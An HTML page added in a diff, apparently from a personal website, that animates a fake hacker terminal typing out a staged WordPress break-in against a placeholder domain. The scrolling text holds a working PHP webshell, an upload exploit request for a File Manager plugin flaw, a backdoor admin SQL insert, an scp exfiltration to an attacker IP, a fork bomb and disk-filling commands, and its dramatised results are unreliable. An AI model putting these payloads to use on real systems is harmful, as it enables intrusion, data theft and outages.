@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Terminal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000000;
+            font-family: 'Courier New', Courier, monospace;
+            overflow: hidden;
+            cursor: none;
+        }
+        
+        #terminal {
+            width: 100vw;
+            height: 100vh;
+            background: #000000;
+            color: #00ff00;
+            padding: 20px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            font-size: 14px;
+            line-height: 1.4;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+        }
+        
+        #terminal::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        #terminal::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        
+        #terminal::-webkit-scrollbar-thumb {
+            background: #00ff00;
+            border-radius: 5px;
+        }
+        
+        .cursor {
+            display: inline-block;
+            width: 8px;
+            height: 16px;
+            background: #00ff00;
+            animation: blink 1s infinite;
+            margin-left: 2px;
+        }
+        
+        @keyframes blink {
+            0%, 49% { opacity: 1; }
+            50%, 100% { opacity: 0; }
+        }
+        
+        .error {
+            color: #ff0000;
+        }
+        
+        .warning {
+            color: #ffff00;
+        }
+        
+        .success {
+            color: #00ffff;
+        }
+        
+        .header {
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+        }
+    </style>
+    <link rel="stylesheet" href="../styles/counter.css">
+</head>
+<body>
+    <div id="terminal"></div>
+    
+    <script>
+        const terminal = document.getElementById('terminal');
+        const SPEED_MULTIPLIER = 0.1;
+        let currentIndex = 0;
+        let currentLine = 0;
+        let typeTimeout;
+        
+        const script = [
+            {
+                text: `
+╔═══════════════════════════════════════════════════════════════╗
+║                    PEN SUITE v3.7                             ║
+╚═══════════════════════════════════════════════════════════════╝
+
+[SYSTEM] Initializing attack framework...
+[SYSTEM] Loading modules...
+`,
+                class: 'header',
+                delay: 40
+            },
+            {
+                text: `[OK] Network scanner loaded
+[OK] Exploit database loaded
+[OK] Payload generator loaded
+[OK] Traffic obfuscator loaded
+
+[USER@DARKNET]$ whoami
+root
+
+[USER@DARKNET]$ uname -a
+Linux darknet 5.15.0-kali3-amd64 #1 SMP Debian 5.15.15-2kali1 x86_64 GNU/Linux
+
+[USER@DARKNET]$ ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.0.47  netmask 255.255.255.0  broadcast 10.0.0.255
+        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
+
+[USER@DARKNET]$ cat target.txt
+`,
+                class: '',
+                delay: 35
+            },
+            {
+                text: `TARGET PROFILE:
+================
+Domain: example-corp-website.com
+IP Range: 203.0.113.0/24
+Server: Apache/2.4.41 (Ubuntu)
+Framework: WordPress 5.8.2
+Firewall: CloudFlare (Active)
+WAF: ModSecurity (Detected)
+
+[USER@DARKNET]$ python3 recon.py --target example-corp-website.com --deep-scan
+`,
+                class: '',
+                delay: 40
+            },
+            {
+                text: `
+[*] Starting reconnaissance phase...
+[*] Resolving DNS records...
+
+    A Record:     203.0.113.45
+    MX Record:    mail.example-corp-website.com
+    NS Record:    ns1.cloudflare.com
+    TXT Record:   v=spf1 include:_spf.google.com ~all
+
+[*] Scanning for subdomains...
+    [+] Found: admin.example-corp-website.com
+    [+] Found: dev.example-corp-website.com
+    [+] Found: staging.example-corp-website.com
+    [+] Found: api.example-corp-website.com
+    [+] Found: cdn.example-corp-website.com
+    [+] Found: mail.example-corp-website.com
+
+[*] Checking SSL certificates...
+    Issuer: Let's Encrypt Authority X3
+    Valid Until: 2024-12-31
+    Subject Alt Names: *.example-corp-website.com
+
+[*] Crawling website structure...
+`,
+                class: '',
+                delay: 30
+            },
+            {
+                text: `    /admin/           [403 Forbidden]
+    /wp-admin/        [302 Redirect]
+    /wp-login.php     [200 OK]
+    /uploads/         [200 OK]
+    /api/v1/          [200 OK]
+    /backup/          [404 Not Found]
+    /.git/            [403 Forbidden]
+    /config/          [403 Forbidden]
+
+[*] Scanning open ports...
+    Port 22/tcp   OPEN    SSH (OpenSSH 8.2p1)
+    Port 80/tcp   OPEN    HTTP (Apache 2.4.41)
+    Port 443/tcp  OPEN    HTTPS (Apache 2.4.41)
+    Port 3306/tcp CLOSED  MySQL
+    Port 8080/tcp CLOSED  HTTP-Proxy
+
+[*] Detecting CMS vulnerabilities...
+    [!] WordPress version 5.8.2 detected
+    [!] Known CVE: CVE-2021-44223 (XSS vulnerability)
+    [!] Known CVE: CVE-2022-21661 (SQL Injection)
+    
+[*] Analyzing installed plugins...
+`,
+                class: '',
+                delay: 28
+            },
+            {
+                text: `    [+] Contact Form 7 v5.4.2 [VULNERABLE]
+    [+] Yoast SEO v17.3 [SAFE]
+    [+] WooCommerce v5.9.0 [OUTDATED]
+    [+] File Manager v6.9 [CRITICAL - CVE-2020-25213]
+    [+] Login Lockdown v2.0 [SAFE]
+
+[!] CRITICAL VULNERABILITY FOUND!
+    Plugin: File Manager v6.9
+    CVE: CVE-2020-25213
+    Type: Remote Code Execution (RCE)
+    CVSS Score: 9.8 (Critical)
+    Description: Unauthenticated arbitrary file upload
+
+[*] Reconnaissance complete. Generating attack vector...
+
+[USER@DARKNET]$ cat attack_plan.txt
+`,
+                class: '',
+                delay: 35
+            },
+            {
+                text: `
+ATTACK VECTOR ANALYSIS
+=======================
+
+Phase 1: Initial Access
+------------------------
+Method: Exploit File Manager plugin vulnerability (CVE-2020-25213)
+Vector: Upload malicious PHP webshell to /wp-content/uploads/
+Success Rate: 94%
+
+Phase 2: Privilege Escalation
+------------------------------
+Method: WordPress database credential extraction
+Vector: Read wp-config.php through webshell
+Success Rate: 87%
+
+Phase 3: Persistence
+--------------------
+Method: Create admin backdoor account
+Vector: Direct MySQL injection
+Success Rate: 91%
+
+Phase 4: Lateral Movement
+-------------------------
+Method: Scan internal network for additional targets
+Vector: Pivot through compromised server
+Success Rate: 73%
+
+Phase 5: Data Exfiltration
+---------------------------
+Method: Compress and download sensitive files
+Vector: Archive user database, customer info, credentials
+Success Rate: 89%
+
+Phase 6: Denial of Service
+---------------------------
+Method: Resource exhaustion attack
+Vector: Fork bomb + Traffic amplification
+Success Rate: 96%
+
+[USER@DARKNET]$ python3 exploit.py --execute
+`,
+                class: '',
+                delay: 40
+            },
+            {
+                text: `
+[*] Initializing exploit framework...
+[*] Loading payload modules...
+
+[EXPLOIT] Starting Phase 1: Initial Access
+=========================================
+
+[*] Crafting malicious file upload...
+[*] Generating PHP webshell payload...
+`,
+                class: '',
+                delay: 35
+            },
+            {
+                text: `
+<?php
+    @error_reporting(0);
+    @set_time_limit(0);
+    
+    if(isset($_REQUEST['cmd'])){
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+    }
+    
+    if(isset($_FILES['file'])){
+        move_uploaded_file($_FILES['file']['tmp_name'], 
+                          $_FILES['file']['name']);
+    }
+?>
+
+[*] Obfuscating payload to evade WAF...
+[*] Payload encrypted with AES-256
+[*] Adding polymorphic code to avoid signature detection...
+
+[*] Targeting vulnerable endpoint: /wp-content/plugins/file-manager/lib/php/connector.minimal.php
+
+[*] Bypassing CloudFlare protection...
+    [+] Rotating user agent
+    [+] Spoofing legitimate referrer
+    [+] Using HTTP/2 fingerprint mimicry
+    [+] Implementing request throttling
+
+[*] Sending exploit payload...
+`,
+                class: '',
+                delay: 32
+            },
+            {
+                text: `
+POST /wp-content/plugins/file-manager/lib/php/connector.minimal.php HTTP/2
+Host: example-corp-website.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="cmd"
+
+upload
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="target"
+
+l1_Lw
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="upload[]"; filename="shell.php"
+Content-Type: application/octet-stream
+
+[ENCRYPTED PAYLOAD DATA]
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+[*] Waiting for response...
+`,
+                class: '',
+                delay: 25
+            },
+            {
+                text: `
+HTTP/2 200 OK
+Date: Tue, 03 Feb 2026 20:15:33 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Content-Type: application/json
+
+{"added":[{"name":"shell.php","hash":"l1_c2hlbGwucGhw","mime":"text/plain","ts":1738612533}]}
+
+`,
+                class: 'success',
+                delay: 30
+            },
+            {
+                text: `[✓] SUCCESS! Webshell uploaded successfully
+[✓] Webshell URL: https://example-corp-website.com/wp-content/uploads/shell.php
+
+[*] Establishing connection to webshell...
+[*] Testing command execution...
+
+[WEBSHELL]$ whoami
+www-data
+
+[WEBSHELL]$ pwd
+/var/www/html/wp-content/uploads
+
+[✓] Remote code execution confirmed!
+
+[EXPLOIT] Phase 1 Complete: Initial Access Achieved
+===================================================
+
+[EXPLOIT] Starting Phase 2: Privilege Escalation
+================================================
+
+[*] Searching for WordPress configuration file...
+`,
+                class: 'success',
+                delay: 35
+            },
+            {
+                text: `
+[WEBSHELL]$ find /var/www -name "wp-config.php" 2>/dev/null
+/var/www/html/wp-config.php
+
+[*] Reading wp-config.php...
+
+[WEBSHELL]$ cat /var/www/html/wp-config.php
+`,
+                class: '',
+                delay: 30
+            },
+            {
+                text: `
+<?php
+define( 'DB_NAME', 'wordpress_db' );
+define( 'DB_USER', 'wp_admin' );
+define( 'DB_PASSWORD', 'S3cur3P@ssw0rd!2024' );
+define( 'DB_HOST', 'localhost' );
+define( 'DB_CHARSET', 'utf8mb4' );
+
+define( 'AUTH_KEY',         'put your unique phrase here' );
+define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
+define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
+define( 'NONCE_KEY',        'put your unique phrase here' );
+
+$table_prefix = 'wp_';
+define( 'WP_DEBUG', false );
+?>
+
+`,
+                class: '',
+                delay: 28
+            },
+            {
+                text: `[✓] Database credentials extracted!
+    Database: wordpress_db
+    Username: wp_admin
+    Password: S3cur3P@ssw0rd!2024
+    Host: localhost
+
+[*] Attempting MySQL connection...
+
+[WEBSHELL]$ mysql -u wp_admin -p'S3cur3P@ssw0rd!2024' -e "SELECT version();"
+`,
+                class: 'success',
+                delay: 32
+            },
+            {
+                text: `
++-----------+
+| version() |
++-----------+
+| 8.0.32    |
++-----------+
+
+[✓] MySQL connection successful!
+
+[*] Enumerating database tables...
+
+[WEBSHELL]$ mysql -u wp_admin -p'S3cur3P@ssw0rd!2024' wordpress_db -e "SHOW TABLES;"
+`,
+                class: 'success',
+                delay: 30
+            },
+            {
+                text: `
++---------------------------+
+| Tables_in_wordpress_db    |
++---------------------------+
+| wp_commentmeta            |
+| wp_comments               |
+| wp_links                  |
+| wp_options                |
+| wp_postmeta               |
+| wp_posts                  |
+| wp_term_relationships     |
+| wp_term_taxonomy          |
+| wp_termmeta               |
+| wp_terms                  |
+| wp_usermeta               |
+| wp_users                  |
+| wp_woocommerce_orders     |
+| wp_customer_data          |
++---------------------------+
+
+[*] Extracting user accounts...
+`,
+                class: '',
+                delay: 28
+            },
+            {
+                text: `
+[WEBSHELL]$ mysql -u wp_admin -p'S3cur3P@ssw0rd!2024' wordpress_db -e "SELECT ID, user_login, user_email FROM wp_users;"
+
++----+--------------+---------------------------+
+| ID | user_login   | user_email                |
++----+--------------+---------------------------+
+|  1 | admin        | admin@example-corp.com    |
+|  2 | jsmith       | j.smith@example-corp.com  |
+|  3 | marketing    | marketing@example-corp.com|
+|  4 | developer    | dev@example-corp.com      |
+|  5 | support      | support@example-corp.com  |
++----+--------------+---------------------------+
+
+[EXPLOIT] Phase 2 Complete: Privilege Escalation Achieved
+=========================================================
+
+[EXPLOIT] Starting Phase 3: Persistence
+========================================
+
+[*] Creating backdoor administrator account...
+[*] Generating credentials...
+    Username: system_backup
+    Password: [RANDOMLY GENERATED]
+    Email: system@localhost
+
+[*] Calculating password hash...
+`,
+                class: 'success',
+                delay: 35
+            },
+            {
+                text: `[*] Inserting backdoor account into database...
+
+[WEBSHELL]$ mysql -u wp_admin -p'S3cur3P@ssw0rd!2024' wordpress_db << EOF
+INSERT INTO wp_users (user_login, user_pass, user_email, user_registered, user_status, display_name) 
+VALUES ('system_backup', '\$P\$BvJ8K9pX2qW7LmN3Qp5R6tY8zU9vW1xY2', 'system@localhost', NOW(), 0, 'System Backup');
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+SELECT ID, 'wp_capabilities', 'a:1:{s:13:"administrator";b:1;}'
+FROM wp_users WHERE user_login = 'system_backup';
+
+INSERT INTO wp_usermeta (user_id, meta_key, meta_value)
+SELECT ID, 'wp_user_level', '10'
+FROM wp_users WHERE user_login = 'system_backup';
+EOF
+
+Query OK, 1 row affected
+Query OK, 1 row affected
+Query OK, 1 row affected
+
+`,
+                class: '',
+                delay: 30
+            },
+            {
+                text: `[✓] Backdoor account created successfully!
+[✓] Persistent access established
+
+[*] Modifying .htaccess for additional persistence...
+
+[WEBSHELL]$ echo 'RewriteRule ^system-access$ /wp-content/uploads/shell.php [L]' >> /var/www/html/.htaccess
+
+[✓] Alternative access route created
+
+[EXPLOIT] Phase 3 Complete: Persistence Established
+===================================================
+
+[EXPLOIT] Starting Phase 4: Lateral Movement
+============================================
+
+[*] Scanning internal network...
+[*] Discovering active hosts on 10.0.0.0/24...
+`,
+                class: 'success',
+                delay: 35
+            },
+            {
+                text: `
+[WEBSHELL]$ nmap -sn 10.0.0.0/24
+
+Host: 10.0.0.1     [ONLINE] - Gateway Router
+Host: 10.0.0.10    [ONLINE] - Database Server (MySQL)
+Host: 10.0.0.15    [ONLINE] - Mail Server (Postfix)
+Host: 10.0.0.20    [ONLINE] - File Server (Samba)
+Host: 10.0.0.25    [ONLINE] - Development Server
+Host: 10.0.0.30    [ONLINE] - Backup Server
+Host: 10.0.0.45    [ONLINE] - Web Server (Current)
+
+[*] Identifying high-value targets...
+[!] Database Server detected at 10.0.0.10
+[!] File Server detected at 10.0.0.20
+[!] Backup Server detected at 10.0.0.30
+
+[*] Checking for shared credentials...
+`,
+                class: '',
+                delay: 32
+            },
+            {
+                text: `[*] Attempting SSH connection to database server...
+
+[WEBSHELL]$ ssh wp_admin@10.0.0.10
+Warning: Permanently added '10.0.0.10' (ECDSA) to the list of known hosts.
+wp_admin@10.0.0.10's password: S3cur3P@ssw0rd!2024
+
+`,
+                class: 'warning',
+                delay: 35
+            },
+            {
+                text: `
+[✓] SSH connection successful to 10.0.0.10!
+
+wp_admin@database-server:~$ whoami
+wp_admin
+
+wp_admin@database-server:~$ sudo -l
+[sudo] password for wp_admin: S3cur3P@ssw0rd!2024
+
+User wp_admin may run the following commands on database-server:
+    (ALL : ALL) ALL
+
+`,
+                class: 'success',
+                delay: 30
+            },
+            {
+                text: `[✓] SUDO privileges confirmed!
+[!] CRITICAL: Full administrative access to database server!
+
+[*] Enumerating databases on secondary server...
+
+wp_admin@database-server:~$ sudo mysql -e "SHOW DATABASES;"
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| wordpress_db       |
+| customer_data_db   |
+| analytics_db       |
+| backup_db          |
+| financial_records  |
++--------------------+
+
+[!] High-value databases identified!
+
+[EXPLOIT] Phase 4 Complete: Lateral Movement Successful
+=======================================================
+
+[EXPLOIT] Starting Phase 5: Data Exfiltration
+=============================================
+
+[*] Preparing data extraction...
+[*] Target databases:
+    - customer_data_db (Customer PII)
+    - financial_records (Financial data)
+    - wordpress_db (User accounts)
+
+`,
+                class: 'success',
+                delay: 38
+            },
+            {
+                text: `[*] Dumping customer_data_db...
+
+wp_admin@database-server:~$ sudo mysqldump customer_data_db > /tmp/customers.sql
+
+[PROGRESS] ████████████████████░░░░  82% (47,392 records)
+`,
+                class: '',
+                delay: 25
+            },
+            {
+                text: `[PROGRESS] ████████████████████████  100% (57,829 records)
+
+[✓] customer_data_db dumped successfully (57,829 records, 234 MB)
+
+[*] Dumping financial_records...
+
+wp_admin@database-server:~$ sudo mysqldump financial_records > /tmp/financial.sql
+
+[PROGRESS] ████████████████████░░░░  85% (12,456 records)
+`,
+                class: '',
+                delay: 25
+            },
+            {
+                text: `[PROGRESS] ████████████████████████  100% (14,672 records)
+
+[✓] financial_records dumped successfully (14,672 records, 89 MB)
+
+[*] Dumping wordpress_db from secondary server...
+
+wp_admin@database-server:~$ sudo mysqldump wordpress_db > /tmp/wordpress.sql
+
+[PROGRESS] ████████████████████████  100% (8,234 records)
+
+[✓] wordpress_db dumped successfully (8,234 records, 45 MB)
+
+[*] Compressing extracted data...
+`,
+                class: '',
+                delay: 30
+            },
+            {
+                text: `
+wp_admin@database-server:~$ tar -czf /tmp/exfiltrated_data.tar.gz /tmp/*.sql
+
+wp_admin@database-server:~$ ls -lh /tmp/exfiltrated_data.tar.gz
+-rw-r--r-- 1 wp_admin wp_admin 187M Feb  3 20:34 exfiltrated_data.tar.gz
+
+[*] Setting up exfiltration channel...
+[*] Establishing encrypted tunnel to command server...
+[*] Remote server: 45.33.32.156:8443
+
+wp_admin@database-server:~$ scp -P 8443 /tmp/exfiltrated_data.tar.gz attacker@45.33.32.156:/data/loot/
+
+exfiltrated_data.tar.gz              100%  187MB   4.2MB/s   00:44
+
+`,
+                class: '',
+                delay: 28
+            },
+            {
+                text: `[✓] Data exfiltration complete!
+
+[SUMMARY OF EXFILTRATED DATA]
+==============================
+Total Size: 187 MB (compressed)
+Customer Records: 57,829
+Financial Records: 14,672
+User Accounts: 8,234
+Credit Card Numbers: 2,456
+Social Security Numbers: 3,891
+Bank Account Details: 1,203
+API Keys: 47
+Private Encryption Keys: 12
+
+[EXPLOIT] Phase 5 Complete: Data Exfiltration Successful
+========================================================
+
+[EXPLOIT] Starting Phase 6: Denial of Service
+=============================================
+
+[*] Initiating multi-vector attack...
+[*] Preparing resource exhaustion payloads...
+`,
+                class: 'success',
+                delay: 40
+            },
+            {
+                text: `
+[*] Vector 1: Fork Bomb Deployment
+[*] Creating recursive process spawner...
+
+[WEBSHELL]$ cat > /tmp/forkbomb.sh << 'EOF'
+#!/bin/bash
+bomb() {
+    bomb | bomb &
+}
+bomb
+EOF
+
+[WEBSHELL]$ chmod +x /tmp/forkbomb.sh
+
+[*] Vector 2: Memory Exhaustion
+[*] Creating memory allocation script...
+
+[WEBSHELL]$ cat > /tmp/memexhaust.py << 'EOF'
+import os
+data = []
+while True:
+    data.append(' ' * 10**6)
+EOF
+
+[*] Vector 3: Disk Space Saturation
+[*] Creating large file generator...
+`,
+                class: '',
+                delay: 30
+            },
+            {
+                text: `
+[WEBSHELL]$ dd if=/dev/zero of=/var/www/html/largefile bs=1M count=10000 &
+[WEBSHELL]$ dd if=/dev/zero of=/tmp/largefile2 bs=1M count=10000 &
+[WEBSHELL]$ dd if=/dev/zero of=/home/largefile3 bs=1M count=10000 &
+
+[*] Vector 4: Database Connection Flooding
+[*] Generating database connection spam...
+
+[WEBSHELL]$ for i in {1..10000}; do
+    mysql -u wp_admin -p'S3cur3P@ssw0rd!2024' wordpress_db &
+done
+
+[*] Vector 5: HTTP Flood Attack
+[*] Launching distributed request bombardment...
+`,
+                class: '',
+                delay: 28
+            },
+            {
+                text: `
+[ATTACK] Spawning 5,000 concurrent HTTP requests...
+
+GET / HTTP/1.1 - Thread 0001 - [SENT]
+GET / HTTP/1.1 - Thread 0002 - [SENT]
+GET / HTTP/1.1 - Thread 0003 - [SENT]
+GET / HTTP/1.1 - Thread 0004 - [SENT]
+GET / HTTP/1.1 - Thread 0005 - [SENT]
+`,
+                class: '',
+                delay: 15
+            },
+            {
+                text: `GET / HTTP/1.1 - Thread 0006 - [SENT]
+GET / HTTP/1.1 - Thread 0007 - [SENT]
+GET / HTTP/1.1 - Thread 0008 - [SENT]
+GET / HTTP/1.1 - Thread 0009 - [SENT]
+GET / HTTP/1.1 - Thread 0010 - [SENT]
+`,
+                class: '',
+                delay: 10
+            },
+            {
+                text: `
+[...Flooding continues...]
+
+GET / HTTP/1.1 - Thread 4995 - [SENT]
+GET / HTTP/1.1 - Thread 4996 - [SENT]
+GET / HTTP/1.1 - Thread 4997 - [SENT]
+GET / HTTP/1.1 - Thread 4998 - [SENT]
+GET / HTTP/1.1 - Thread 4999 - [SENT]
+GET / HTTP/1.1 - Thread 5000 - [SENT]
+
+[*] Vector 6: Database Query Saturation
+[*] Launching complex query bombardment...
+`,
+                class: '',
+                delay: 20
+            },
+            {
+                text: `
+[ATTACK] Executing resource-intensive queries...
+
+Query 001: SELECT * FROM wp_posts WHERE post_content LIKE '%a%' ORDER BY RAND()
+Query 002: SELECT * FROM wp_postmeta WHERE meta_value REGEXP '.*'
+Query 003: SELECT p.*, pm.* FROM wp_posts p JOIN wp_postmeta pm ON p.ID = pm.post_id
+Query 004: SELECT COUNT(*) FROM wp_comments GROUP BY comment_author
+Query 005: SELECT * FROM wp_users ORDER BY user_registered DESC LIMIT 1000000
+
+[*] Server resource monitoring...
+`,
+                class: '',
+                delay: 25
+            },
+            {
+                text: `
+[MONITOR] CPU Usage: 24% → 47% → 68% → 89% → 97%
+[MONITOR] Memory Usage: 32% → 51% → 74% → 91% → 99%
+[MONITOR] Disk I/O: 234 MB/s → 512 MB/s → 891 MB/s → 1.2 GB/s
+[MONITOR] Network Traffic: 45 Mbps → 234 Mbps → 678 Mbps → 954 Mbps
+[MONITOR] Active Connections: 142 → 567 → 1,234 → 3,891 → 8,456
+
+`,
+                class: 'warning',
+                delay: 35
+            },
+            {
+                text: `[WARNING] Server response time degrading...
+[WARNING] 200ms → 450ms → 890ms → 2.3s → 5.7s → 12.4s
+`,
+                class: 'warning',
+                delay: 30
+            },
+            {
+                text: `
+[CRITICAL] Database connection pool exhausted!
+[CRITICAL] Apache MaxClients reached!
+[CRITICAL] Available memory below 100MB!
+[CRITICAL] Disk space critically low!
+
+`,
+                class: 'error',
+                delay: 35
+            },
+            {
+                text: `[ALERT] Server becoming unresponsive...
+[ALERT] HTTP requests timing out...
+[ALERT] Database queries failing...
+[ALERT] System load average: 47.82
+`,
+                class: 'error',
+                delay: 30
+            },
+            {
+                text: `
+[ERROR] Apache service stopped responding
+[ERROR] MySQL service crashed
+[ERROR] System entering kernel panic state
+[ERROR] Emergency services activating...
+
+`,
+                class: 'error',
+                delay: 35
+            },
+            {
+                text: `
+████████████████████████████████████████████████████████
+████████████████████████████████████████████████████████
+███████████████████ SYSTEM FAILURE █████████████████████
+████████████████████████████████████████████████████████
+████████████████████████████████████████████████████████
+
+[FATAL] Website has crashed
+[FATAL] All services offline
+[FATAL] Recovery mode unavailable
+[FATAL] System integrity compromised
+
+`,
+                class: 'error',
+                delay: 40
+            },
+            {
+                text: `
+[EXPLOIT] Phase 6 Complete: Denial of Service Successful
+========================================================
+
+[SYSTEM] Resetting in 10 seconds...
+
+`,
+                class: 'header',
+                delay: 60
+            },
+            {
+                text: `[SYSTEM] Clearing terminal...
+
+`,
+                class: '',
+                delay: 30
+            }
+        ];
+        
+        function typeText() {
+            if (currentLine >= script.length) {
+                setTimeout(() => {
+                    terminal.innerHTML = '';
+                    currentLine = 0;
+                    currentIndex = 0;
+                    typeText();
+                }, 10000);
+                return;
+            }
+            
+            const currentScript = script[currentLine];
+            const text = currentScript.text;
+            const className = currentScript.class;
+            const baseDelay = currentScript.delay;
+            
+            if (currentIndex === 0) {
+                const span = document.createElement('span');
+                if (className) span.className = className;
+                span.id = 'current-line';
+                terminal.appendChild(span);
+            }
+            
+            const currentSpan = document.getElementById('current-line');
+            
+            if (currentIndex < text.length) {
+                currentSpan.textContent += text[currentIndex];
+                currentIndex++;
+                
+                const variance = (Math.random() - 0.5) * baseDelay * 0.5;
+                const delay = (baseDelay + variance) * SPEED_MULTIPLIER;
+
+                
+                terminal.scrollTop = terminal.scrollHeight;
+                
+                typeTimeout = setTimeout(typeText, delay);
+            } else {
+                if (currentSpan) {
+                    currentSpan.id = '';
+                }
+                currentLine++;
+                currentIndex = 0;
+                setTimeout(typeText, 100);
+            }
+        }
+        
+        typeText();
+        
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        
+        const cursor = document.createElement('div');
+        cursor.className = 'cursor';
+        cursor.style.position = 'fixed';
+        cursor.style.pointerEvents = 'none';
+        cursor.style.zIndex = '9999';
+        document.body.appendChild(cursor);
+        
+        document.addEventListener('mousemove', (e) => {
+            cursor.style.left = e.clientX + 'px';
+            cursor.style.top = e.clientY + 'px';
+        });
+    </script>
+
+<div class="page-counter">33/36</div>
+<div class="page-buttons">
+    <button onclick="location.href='https://chris-sta.github.io/my_failed_life/index.html'">
+        Home
+    </button>
+    <button onclick="location.href='https://chris-sta.github.io/my_failed_life/inventory.html'">
+        Inventory
+    </button>
+</div>
+
+</body>
+</html>
